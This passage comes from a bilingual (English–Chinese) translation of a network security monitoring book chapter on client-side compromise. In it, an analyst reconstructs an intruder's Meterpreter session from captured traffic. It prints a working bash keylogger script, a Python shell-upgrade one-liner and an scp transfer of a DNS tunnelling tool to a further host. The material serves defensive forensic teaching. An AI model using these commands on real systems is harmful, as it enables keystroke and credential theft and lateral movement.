  id: totrans-1009
  prefs: []
  type: TYPE_NORMAL
  zh: '..............'
- en: '*Listing 11-12: The net_config_get_interfaces and net_config_get_routes functions*'
  id: totrans-1010
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 11-12：net_config_get_interfaces 和 net_config_get_routes 函数*'
- en: The getwd command in Listing 11-13 probably means to get the working
  id: totrans-1011
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 11-13 中的 getwd 命令可能是获取工作
- en: directory, followed by a mention of the */home/ubu32* directory.
  id: totrans-1012
  prefs: []
  type: TYPE_NORMAL
  zh: 目录，后面提到 */home/ubu32* 目录。
- en: '%...........................P@......'
  id: totrans-1013
  prefs: []
  type: TYPE_NORMAL
  zh: '%...........................P@......'
- en: '........................................................................,@.....................'
  id: totrans-1014
  prefs: []
  type: TYPE_NORMAL
  zh: '........................................................................,@.....................'
- en: '..................'
  id: totrans-1015
  prefs: []
  type: TYPE_NORMAL
  zh: '..................'
- en: 'DST: ...I............stdapi_fs_**getwd**....)....55282344159994215019998291531526\.'
  id: totrans-1016
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: ...I............stdapi_fs_**getwd**....)....55282344159994215019998291531526\.'
- en: 'SRC: .'
  id: totrans-1017
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: .'
- en: 'SRC: ..i............stdapi_fs_getwd....)....55282344159994215019998291531526.........
    **/home/**'
  id: totrans-1018
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ..i............stdapi_fs_getwd....)....55282344159994215019998291531526.........
    **/home/**'
- en: '**ubu32**.............'
  id: totrans-1019
  prefs: []
  type: TYPE_NORMAL
  zh: '**ubu32**.............'
- en: '*Listing 11-13: The getwd command and* /home/ubu32 *reference*'
  id: totrans-1020
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 11-13：getwd 命令和* /home/ubu32 *引用*'
- en: Listing 11-14 shows the most interesting entry so far. The string keylog
  id: totrans-1021
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 11-14 显示了到目前为止最有趣的条目。字符串 keylog
- en: .sh indicates that a keylogger is involved. If the intruder can capture keystrokes
  id: totrans-1022
  prefs: []
  type: TYPE_NORMAL
  zh: .sh 表示涉及键盘记录器。如果入侵者能够捕获按键
- en: on the victim, he can access all sorts of information and potentially other
  id: totrans-1023
  prefs: []
  type: TYPE_NORMAL
  zh: 在受害者的计算机上，他可以访问各种信息，并可能获取其他
- en: systems. Following the name of the script appears to be the script itself, as
  id: totrans-1024
  prefs: []
  type: TYPE_NORMAL
  zh: 系统。脚本的名称后面似乎是脚本本身，如
- en: 'well as the name of the file used to save the logged keystrokes: */tmp/.xkey.log*.'
  id: totrans-1025
  prefs: []
  type: TYPE_NORMAL
  zh: 以及用于保存记录的按键日志的文件名：*/tmp/.xkey.log*。
- en: With this information, we could look for the file on the victim hard drive,
  id: totrans-1026
  prefs: []
  type: TYPE_NORMAL
  zh: 有了这些信息，我们可以在受害者硬盘上查找该文件，
- en: assuming the intruder didn’t delete it or the system didn’t remove it after
  id: totrans-1027
  prefs: []
  type: TYPE_NORMAL
  zh: 假设入侵者没有删除它，或者系统没有在之后删除它
- en: rebooting.
  id: totrans-1028
  prefs: []
  type: TYPE_NORMAL
  zh: 重启。
- en: 'DST: ................core_channel_open....)....64467327797845790259721795802753........3std
    api_fs_file........6........................ **keylog.sh**.........wbb.'
  id: totrans-1029
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: ................core_channel_open....)....64467327797845790259721795802753........3std
    api_fs_file........6........................ **keylog.sh**.........wbb.'
- en: 'SRC: .'
  id: totrans-1030
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: .'
- en: 'SRC: ..c............core_channel_open....)....64467327797845790259721795802753........2.......'
  id: totrans-1031
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ..c............core_channel_open....)....64467327797845790259721795802753........2.......'
- en: '.........'
  id: totrans-1032
  prefs: []
  type: TYPE_NORMAL
  zh: '.........'
- en: 'DST: ................core_channel_write....)....05544054210663822153934887650143........2.....'
  id: totrans-1033
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: ................core_channel_write....)....05544054210663822153934887650143........2.....'
- en: ..X...4#!/bin/bash
  id: totrans-1034
  prefs: []
  type: TYPE_NORMAL
  zh: ..X...4#!/bin/bash
- en: 'DST: export DISPLAY=:0.0'
  id: totrans-1035
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: export DISPLAY=:0.0'
- en: 'DST: xinput list'
  id: totrans-1036
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: xinput list'
- en: 'DST: echo -e "KBD ID ?"'
  id: totrans-1037
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: echo -e "KBD ID ?"'
- en: 'DST: read kbd'
  id: totrans-1038
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: 读取 kbd'
- en: 'DST: xmodmap -pke > **/tmp/.xkey.log**'
  id: totrans-1039
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: xmodmap -pke > **/tmp/.xkey.log**'
- en: 'DST: script -c "xinput test $kbd" | cat >> /**tmp/.xkey.log** & DST: echo "The
    keylog can be downloaded from **/tmp/.xkey.log**"'
  id: totrans-1040
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: script -c "xinput test $kbd" | cat >> /**tmp/.xkey.log** & DST: echo "键盘记录日志可以从
    **/tmp/.xkey.log** 下载"'
- en: 'DST: echo "Use the meterpreter download function"'
  id: totrans-1041
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: echo "使用 meterpreter 下载功能"'
- en: 'DST: echo "Press CTLR+C to exit this session, **keylogger will run in background**"'
  id: totrans-1042
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: echo "按 CTLR+C 退出此会话，**键盘记录器将在后台运行**"'
- en: '*Listing 11-14: Keylogger references*'
  id: totrans-1043
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 11-14：键盘记录器引用*'
- en: The intruder appears to run an ls -al command next. (Listing 11-15
  id: totrans-1044
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者似乎接下来执行了一个 ls -al 命令。(列表 11-15
- en: shows only part of the output, although all of it was present in the transcript.)
  id: totrans-1045
  prefs: []
  type: TYPE_NORMAL
  zh: 仅显示输出的一部分，尽管整个内容都在记录中。)
- en: Client-side Compromise **253**
  id: totrans-1046
  prefs: []
  type: TYPE_NORMAL
  zh: 客户端妥协 **253**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1047
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 'DST: ...s............core_channel_write....)....27069574503151630704223424155348........2......'
  id: totrans-1048
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: ...s............core_channel_write....)....27069574503151630704223424155348........2......'
- en: '.....4**ls -al**'
  id: totrans-1049
  prefs: []
  type: TYPE_NORMAL
  zh: '.....4**ls -al**'
- en: '**DST:** ............'
  id: totrans-1050
  prefs: []
  type: TYPE_NORMAL
  zh: '**DST:** ............'
- en: 'SRC: .'
  id: totrans-1051
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: .'
- en: 'SRC: ..d............core_channel_write....)....27069574503151630704223424155348...............'
  id: totrans-1052
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ..d............core_channel_write....)....27069574503151630704223424155348...............'
- en: '..........'
  id: totrans-1053
  prefs: []
  type: TYPE_NORMAL
  zh: '..........'
- en: 'SRC: .'
  id: totrans-1054
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: .'
- en: 'SRC: ..............2.......W...4total 164'
  id: totrans-1055
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ..............2.......W...4total 164'
- en: 'SRC: drwxr-xr-x 24 ubu32 ubu32 4096 Mar 16 10:22 .'
  id: totrans-1056
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: drwxr-xr-x 24 ubu32 ubu32 4096 3月 16日 10:22 .'
- en: 'SRC: drwxr-xr-x 3 root root 4096 Mar 8 21:00 ..'
  id: totrans-1057
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: drwxr-xr-x 3 root root 4096 3月 8日 21:00 ..'
- en: 'SRC: -rw------- 1 ubu32 ubu32 4447 Mar 16 08:17 .bash_history'
  id: totrans-1058
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: -rw------- 1 ubu32 ubu32 4447 3月 16日 08:17 .bash_history'
- en: 'SRC: -rw-r--r-- 1 ubu32 ubu32 220 Mar 8 21:00 .bash_logout'
  id: totrans-1059
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: -rw-r--r-- 1 ubu32 ubu32 220 3月 8日 21:00 .bash_logout'
- en: 'SRC: -rw-r--r-- 1 ubu32 ubu32 3486 Mar 8 21:00 .bashrc'
  id: totrans-1060
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: -rw-r--r-- 1 ubu32 ubu32 3486 3月 8日 21:00 .bashrc'
- en: 'SRC: drwx------ 15 ubu32 ubu32 4096 Mar 16 06:29 .cache'
  id: totrans-1061
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: drwx------ 15 ubu32 ubu32 4096 3月 16日 06:29 .cache'
- en: 'SRC: drwxrwxr-x 3 ubu32 ubu32 4096 Mar 15 08:52 .compiz-1'
  id: totrans-1062
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: drwxrwxr-x 3 ubu32 ubu32 4096 3月 15日 08:52 .compiz-1'
- en: 'SRC: drwx------ 11 ubu32 ubu32 4096 Mar 16 09:34 .config'
  id: totrans-1063
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: drwx------ 11 ubu32 ubu32 4096 3月 16日 09:34 .config'
- en: 'SRC: drwx------ 3 ubu32 ubu32 4096 Mar 8 21:34 .dbus'
  id: totrans-1064
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: drwx------ 3 ubu32 ubu32 4096 3月 8日 21:34 .dbus'
- en: 'SRC: drwxr-xr-x 2 ubu32 ubu32 4096 Mar 8 21:34 Desktop'
  id: totrans-1065
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: drwxr-xr-x 2 ubu32 ubu32 4096 3月 8日 21:34 Desktop'
- en: 'SRC: -rw-r--r-- 1 ubu32 ubu32 26 Mar 16 09:08 .dmrc'
  id: totrans-1066
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: -rw-r--r-- 1 ubu32 ubu32 26 3月 16日 09:08 .dmrc'
- en: 'SRC: drwxr-xr-x 2 ubu32 ubu32 4096 Mar 8 21:34 Documents'
  id: totrans-1067
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: drwxr-xr-x 2 ubu32 ubu32 4096 3月 8日 21:34 Documents'
- en: '*Listing 11-15: An ls -al command*'
  id: totrans-1068
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 11-15：ls -al 命令*'
- en: The next command, mv keylog.sh .pulse, shows the intruder moving his
  id: totrans-1069
  prefs: []
  type: TYPE_NORMAL
  zh: 下一个命令，mv keylog.sh .pulse，显示了入侵者将他的
- en: keylogger script into the *.pulse* directory, as shown in Listing 11-16\. Next,
    he changes the user permissions to rwx, for read-write-execute.
  id: totrans-1070
  prefs: []
  type: TYPE_NORMAL
  zh: 键盘记录器脚本被移动到 *.pulse* 目录，如列表 11-16 所示。接下来，他将用户权限更改为 rwx，表示读写执行权限。
- en: 'DST: ................core_channel_write....)....64553530986314682019983298603129........2......'
  id: totrans-1071
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: ................core_channel_write....)....64553530986314682019983298603129........2......'
- en: '.....4**mv keylog.sh .pulse**'
  id: totrans-1072
  prefs: []
  type: TYPE_NORMAL
  zh: '.....4**mv keylog.sh .pulse**'
- en: 'DST: ................core_channel_write....)....60405588103478885840826252268236........2......'
  id: totrans-1073
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: ................core_channel_write....)....60405588103478885840826252268236........2......'
- en: '.....4chmod u=**rwx** keylog.sh'
  id: totrans-1074
  prefs: []
  type: TYPE_NORMAL
  zh: '.....4chmod u=**rwx** keylog.sh'
- en: 'DST: ............'
  id: totrans-1075
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: ............'
- en: 'SRC: .'
  id: totrans-1076
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: .'
- en: 'SRC: ..d............core_channel_write....)....60405588103478885840826252268236...............'
  id: totrans-1077
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ..d............core_channel_write....)....60405588103478885840826252268236...............'
- en: '..........'
  id: totrans-1078
  prefs: []
  type: TYPE_NORMAL
  zh: '..........'
- en: '*Listing 11-16: The mv keylog.sh .pulse command and rxw permissions*'
  id: totrans-1079
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 11-16：* mv keylog.sh .pulse 命令和 rxw 权限*'
- en: Here, the intruder appears to execute his *keylog.sh* script. (The output of
  id: totrans-1080
  prefs: []
  type: TYPE_NORMAL
  zh: 在这里，入侵者似乎执行了他的 *keylog.sh* 脚本。 (输出来自
- en: the script follows in Listing 11-17.) This script gives the intruder a chance
    to
  id: totrans-1081
  prefs: []
  type: TYPE_NORMAL
  zh: 在 11-17 列表中的脚本后续内容。) 这个脚本给了入侵者一个机会
- en: select the keyboard to monitor and reminds him to look in the */tmp/.xkey.log*
  id: totrans-1082
  prefs: []
  type: TYPE_NORMAL
  zh: 选择键盘进行监控，并提醒他查看 */tmp/.xkey.log*
- en: directory for results.
  id: totrans-1083
  prefs: []
  type: TYPE_NORMAL
  zh: 结果目录。
- en: 'DST: ...x............core_channel_write....)....75957044127671614064150081298305........2......'
  id: totrans-1084
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: ...x............core_channel_write....)....75957044127671614064150081298305........2......'
- en: '.....4\. **/keylog.sh**'
  id: totrans-1085
  prefs: []
  type: TYPE_NORMAL
  zh: '.....4\. **/keylog.sh**'
- en: 'DST: ............'
  id: totrans-1086
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: ............'
- en: 'SRC: .'
  id: totrans-1087
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: .'
- en: 'SRC: ..d............core_channel_write....)....75957044127671614064150081298305...............'
  id: totrans-1088
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ..d............core_channel_write....)....75957044127671614064150081298305...............'
- en: '..........'
  id: totrans-1089
  prefs: []
  type: TYPE_NORMAL
  zh: '..........'
- en: 'SRC: .'
  id: totrans-1090
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: .'
- en: 'SRC: ..............2...........4... Virtual core pointer .id=2.[master pointer
    (3)]'
  id: totrans-1091
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ..............2...........4... Virtual core pointer .id=2.[master pointer
    (3)]'
- en: '**254** Chapter 11'
  id: totrans-1092
  prefs: []
  type: TYPE_NORMAL
  zh: '**254** 第11章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1093
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 'SRC: ... ... Virtual core XTEST pointer .id=4.[slave pointer (2)]'
  id: totrans-1094
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ... ... Virtual core XTEST pointer .id=4.[slave pointer (2)]'
- en: 'SRC: ... ... VMware VMware Virtual USB Mouse .id=7.[slave pointer (2)]'
  id: totrans-1095
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ... ... VMware VMware Virtual USB Mouse .id=7.[slave pointer (2)]'
- en: 'SRC: ... ... VMware VMware Virtual USB Mouse .id=8.[slave pointer (2)]'
  id: totrans-1096
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ... ... VMware VMware Virtual USB Mouse .id=8.[slave pointer (2)]'
- en: 'SRC: ... ... ImPS/2 Generic Wheel Mouse .id=10.[slave pointer (2)]'
  id: totrans-1097
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ... ... ImPS/2 Generic Wheel Mouse .id=10.[slave pointer (2)]'
- en: 'SRC: ... Virtual core keyboard .id=3.[master keyboard (2)]'
  id: totrans-1098
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ... Virtual core keyboard .id=3.[master keyboard (2)]'
- en: 'SRC: ... Virtual core XTEST keyboard .id=5.[slave keyboard (3)]'
  id: totrans-1099
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ... Virtual core XTEST keyboard .id=5.[slave keyboard (3)]'
- en: 'SRC: ... Power Button .id=6.[slave keyboard (3)]'
  id: totrans-1100
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ... Power Button .id=6.[slave keyboard (3)]'
- en: 'SRC: ... AT Translated Set 2 keyboard .id=9.[slave keyboard (3)]'
  id: totrans-1101
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ... AT Translated Set 2 keyboard .id=9.[slave keyboard (3)]'
- en: 'SRC: ....................core_channel_write....)....SRREVPPXSOANPPYWFQHSVCNMFFBJBMMJ....u......'
  id: totrans-1102
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ....................core_channel_write....)....SRREVPPXSOANPPYWFQHSVCNMFFBJBMMJ....u......'
- en: '.....2...........4KBD ID ?'
  id: totrans-1103
  prefs: []
  type: TYPE_NORMAL
  zh: '.....2...........4KBD ID ?'
- en: 'SRC: ....................core_channel_write....)....NBVSIORNAUEQNTEQFFFCJMHXSAEMNQNA.'
  id: totrans-1104
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ....................core_channel_write....)....NBVSIORNAUEQNTEQFFFCJMHXSAEMNQNA.'
- en: 'DST: ...n............core_channel_write....)....45042497071271683260243072775318........2.....'
  id: totrans-1105
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: ...n............core_channel_write....)....45042497071271683260243072775318........2.....'
- en: ..
  id: totrans-1106
  prefs: []
  type: TYPE_NORMAL
  zh: ..
- en: 'DST: ...49'
  id: totrans-1107
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: ...49'
- en: 'DST: ............'
  id: totrans-1108
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: ............'
- en: 'SRC: .'
  id: totrans-1109
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: .'
- en: 'SRC: ..d............core_channel_write....)....45042497071271683260243072775318...............'
  id: totrans-1110
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ..d............core_channel_write....)....45042497071271683260243072775318...............'
- en: '..........'
  id: totrans-1111
  prefs: []
  type: TYPE_NORMAL
  zh: '..........'
- en: 'SRC: .'
  id: totrans-1112
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: .'
- en: 'SRC: ..............2...........4**The keylog can be downloaded from /tmp/.xkey.log**'
  id: totrans-1113
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: ..............2...........4**键盘记录可以从 /tmp/.xkey.log 下载**'
- en: 'SRC: Use the meterpreter download function'
  id: totrans-1114
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: 使用 meterpreter 下载功能'
- en: 'SRC: Press CTLR+C to exit this session, keylogger will run in backround'
  id: totrans-1115
  prefs: []
  type: TYPE_NORMAL
  zh: 'SRC: 按 CTLR+C 退出此会话，键盘记录器将在后台运行'
- en: '*Listing 11-17: The* keylog .sh *script and reminder*'
  id: totrans-1116
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 11-17：* keylog .sh *脚本和提醒*'
- en: Next, we see evidence that the intruder transferred a file called
  id: totrans-1117
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们看到证据表明入侵者将名为
- en: '*iodine_0.6.0~rc1-7_i386.deb* from 203.0.113.15 to 172.16.0.37, as shown in'
  id: totrans-1118
  prefs: []
  type: TYPE_NORMAL
  zh: '*iodine_0.6.0~rc1-7_i386.deb* 从 203.0.113.15 传输到 172.16.0.37，如下所示'
- en: Listing 11-18\. This appears to be a Debian package of the Iodine covert
  id: totrans-1119
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 11-18。这似乎是 Iodine 隐蔽工具的 Debian 包
- en: DNS tunnel tool. The intruder must have used this tool to create the tens
  id: totrans-1120
  prefs: []
  type: TYPE_NORMAL
  zh: DNS 隧道工具。入侵者肯定使用了这个工具来创建成百上千个
- en: of thousands of unusual DNS entries discussed earlier.
  id: totrans-1121
  prefs: []
  type: TYPE_NORMAL
  zh: 前面讨论过的成千上万条异常的 DNS 条目。
- en: 'DST: ................core_channel_open....)....32392496134731212115385138997235........3std
    api_fs_file........6...................$.... **iodine_0.6.0~rc1-7_i386.deb**.........wbb.'
  id: totrans-1122
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: ................core_channel_open....)....32392496134731212115385138997235........3std
    api_fs_file........6...................$.... **iodine_0.6.0~rc1-7_i386.deb**.........wbb.'
- en: '*Listing 11-18: The* iodine_0 .6 .0~rc1-7_i386 .deb *reference*'
  id: totrans-1123
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 11-18：* iodine_0 .6 .0~rc1-7_i386 .deb *参考*'
- en: '***Improving the Shell***'
  id: totrans-1124
  prefs: []
  type: TYPE_NORMAL
  zh: '***改进Shell***'
- en: The next command is fascinating, as shown in Listing 11-19\. By running
  id: totrans-1125
  prefs: []
  type: TYPE_NORMAL
  zh: 下一条命令很有趣，如列表 11-19 所示。通过运行
- en: python -c 'import pty;pty.spawn("/bin/bash")', the intruder improves the shell
    he is using on the victim system by starting a Bash shell. By using Python
  id: totrans-1126
  prefs: []
  type: TYPE_NORMAL
  zh: python -c 'import pty;pty.spawn("/bin/bash")'，入侵者通过使用 Python 启动 Bash shell 改进了他在受害者系统上使用的
    shell。
- en: to start a Bash shell, he creates a shell that can prompt the user and accept
  id: totrans-1127
  prefs: []
  type: TYPE_NORMAL
  zh: 为了启动 Bash shell，他创建了一个可以提示用户并接受
- en: replies. (When an intruder opens a shell with Meterpreter, he may not have
  id: totrans-1128
  prefs: []
  type: TYPE_NORMAL
  zh: 回复。（当入侵者使用 Meterpreter 打开 shell 时，他可能没有
- en: access that allows him to enter passwords when prompted. This is a problem
  id: totrans-1129
  prefs: []
  type: TYPE_NORMAL
  zh: 使得他可以在被提示时输入密码。这是一个问题
- en: when trying to run sudo or answer any other command that prompts the user.)
  id: totrans-1130
  prefs: []
  type: TYPE_NORMAL
  zh: 当尝试运行 sudo 或回答任何其他提示用户的命令时。)
- en: 'DST: ................core_channel_write....)....07078092619529470178701062926304........2......'
  id: totrans-1131
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: ................core_channel_write....)....07078092619529470178701062926304........2......'
- en: .6...4**python -c 'import pty;pty.spawn("/bin/bash")'**
  id: totrans-1132
  prefs: []
  type: TYPE_NORMAL
  zh: .6...4**python -c 'import pty;pty.spawn("/bin/bash")'**
- en: '*Listing 11-19: Bash shell startup*'
  id: totrans-1133
  prefs: []
  type: TYPE_NORMAL
  zh: '*清单 11-19：Bash shell 启动*'
- en: Client-side Compromise **255**
  id: totrans-1134
  prefs: []
  type: TYPE_NORMAL
  zh: 客户端妥协 **255**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1135
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: Continuing through the transcript reveals the reason for the Bash shell.
  id: totrans-1136
  prefs: []
  type: TYPE_NORMAL
  zh: 继续查看转录内容可以揭示 Bash shell 的原因。
- en: The intruder uses scp, as shown in Listing 11-20, to transfer (via SSH) the
  id: totrans-1137
  prefs: []
  type: TYPE_NORMAL
  zh: 如清单 11-20 所示，入侵者使用 scp 通过 SSH 传输
- en: '*iodine_0.6.0~rc1-7_i386.deb* package from 172.16.0.37 to 10.0.0.99 as user
    ubu32\.'
  id: totrans-1138
  prefs: []
  type: TYPE_NORMAL
  zh: '*iodine_0.6.0~rc1-7_i386.deb* 软件包从 172.16.0.37 传输到 10.0.0.99，用户为 ubu32\。'
- en: How does the intruder have the password to log in to 10.0.0.99? He prob-
  id: totrans-1139
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者是如何获取登录 10.0.0.99 的密码的？他是否进行了暴力破解？
- en: ably captured it with his keylogger.
  id: totrans-1140
  prefs: []
  type: TYPE_NORMAL
  zh: 他很可能通过键盘记录器捕获了它。
- en: 'DST: ................core_channel_write....)....28332839019310295629231957979483........2......'
  id: totrans-1141
  prefs: []
  type: TYPE_NORMAL
  zh: 'DST: ................core_channel_write....)....28332839019310295629231957979483........2......'
- en: .=...4**scp** **iodine_0.6.0~rc1-7_i386.deb** **ubu32@10.0.0.99:/tmp**
  id: totrans-1142
  prefs: []
  type: TYPE_NORMAL
  zh: .=...4**scp** **iodine_0.6.0~rc1-7_i386.deb** **ubu32@10.0.0.99:/tmp**
- en: '*Listing 11-20: Transfer of the* iodine_0 .6 .0~rc1-7_i386 .deb *package*'
  id: totrans-1143
  prefs: []
  type: TYPE_NORMAL
  zh: '*清单 11-20：* iodine_0.6.0~rc1-7_i386.deb *软件包的传输*'
- en: '***Summarizing Stage 1***'
  id: totrans-1144
  prefs: []
  type: TYPE_NORMAL
  zh: '***总结阶段 1***'
- en: At this point, the intruder has taken several steps involving one victim sys-
  id: totrans-1145
  prefs: []
  type: TYPE_NORMAL
  zh: 此时，入侵者已经采取了几个步骤，涉及一个受害者的系统-
- en: tem, as summarized in Figure 11-17\. He enticed a user to click a malicious
  id: totrans-1146
  prefs: []
  type: TYPE_NORMAL
  zh: 系统，如图 11-17 所总结。他诱使用户点击一个恶意
- en: link posted to Twitter. That link pointed to a URL involving 203.0.113.15,
  id: totrans-1147
  prefs: []
  type: TYPE_NORMAL
  zh: Twitter 上发布的链接指向一个涉及 203.0.113.15 的 URL，
- en: and the victim 172.16.0.37 visited a web server on the intruder’s system.
  id: totrans-1148
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者 172.16.0.37 访问了入侵者系统上的 Web 服务器。
- en: That malicious web server offered code that exploited a vulnerable Java
  id: totrans-1149
  prefs: []
  type: TYPE_NORMAL
  zh: 那个恶意 Web 服务器提供的代码利用了一个易受攻击的 Java
- en: instance on 172.16.0.37\. The payload delivered with the Java exploit caused
  id: totrans-1150
  prefs: []
  type: TYPE_NORMAL
  zh: 在 172.16.0.37 上的实例。通过 Java 漏洞传送的有效负载导致
- en: the victim to reach back again to 203.0.113.15 to retrieve more attack soft-
  id: totrans-1151
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者再次连接 203.0.113.15 以获取更多攻击软件-
- en: ware from the intruder.
  id: totrans-1152
  prefs: []
  type: TYPE_NORMAL
  zh: 从入侵者处获取恶意软件。
- en: 1\. Victim clicks on malicious URL on Twitter.
  id: totrans-1153
  prefs: []
  type: TYPE_NORMAL
  zh: 1\. 受害者点击了 Twitter 上的恶意链接。
- en: SOCIAL MEDIA OR OTHER COMMUNICATION
  id: totrans-1154
  prefs: []
  type: TYPE_NORMAL
  zh: 社交媒体或其他通讯工具
- en: Victim
  id: totrans-1155
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者
- en: Twitter
  id: totrans-1156
  prefs: []
  type: TYPE_NORMAL
  zh: Twitter
- en: 172.16.0.37
  id: totrans-1157
  prefs: []
  type: TYPE_NORMAL
  zh: 172.16.0.37
- en: 2\. Victim web browser connects to
  id: totrans-1158
  prefs: []
  type: TYPE_NORMAL
  zh: 2\. 受害者的 Web 浏览器连接到
- en: 203.0.113.15:8080/healthcarenews.
  id: totrans-1159
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.15:8080/healthcarenews.
- en: NETWORK CONNECTION
  id: totrans-1160
  prefs: []
  type: TYPE_NORMAL
  zh: 网络连接
- en: Intruder 1
  id: totrans-1161
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者 1
- en: Victim
  id: totrans-1162
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者
- en: 203.0.113.15
  id: totrans-1163
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.15
- en: 172.16.0.37
  id: totrans-1164
  prefs: []
  type: TYPE_NORMAL
  zh: 172.16.0.37
- en: 3\. Attack method exploits vulnerable Java
  id: totrans-1165
  prefs: []
  type: TYPE_NORMAL
  zh: 3\. 攻击方法利用了易受攻击的 Java
- en: Exploited
  id: totrans-1166
  prefs: []
  type: TYPE_NORMAL
  zh: 被利用
- en: software on victim system to execute code.
  id: totrans-1167
  prefs: []
  type: TYPE_NORMAL
  zh: 软件通过受害者系统执行代码。
- en: 4\. Malicious code causes victim to reach back to intruder
  id: totrans-1168
  prefs: []
  type: TYPE_NORMAL
  zh: 4\. 恶意代码导致受害者回溯到入侵者处
- en: so intruder can retrieve more malicious software.
  id: totrans-1169
  prefs: []
  type: TYPE_NORMAL
  zh: 这样入侵者就能获取更多恶意软件。
- en: NETWORK CONNECTION
  id: totrans-1170
  prefs: []
  type: TYPE_NORMAL
  zh: 网络连接
- en: Intruder 1
  id: totrans-1171
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者 1
- en: Victim
  id: totrans-1172
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者
- en: 203.0.113.15
  id: totrans-1173
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.15
- en: 172.16.0.37
  id: totrans-1174
  prefs: []
  type: TYPE_NORMAL
  zh: 172.16.0.37
- en: '*Figure 11-17: A summary of stage 1 of the client-side compromise*'
  id: totrans-1175
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 11-17：客户端妥协阶段 1 的总结*'
- en: '**256** Chapter 11'
  id: totrans-1176
  prefs: []
  type: TYPE_NORMAL
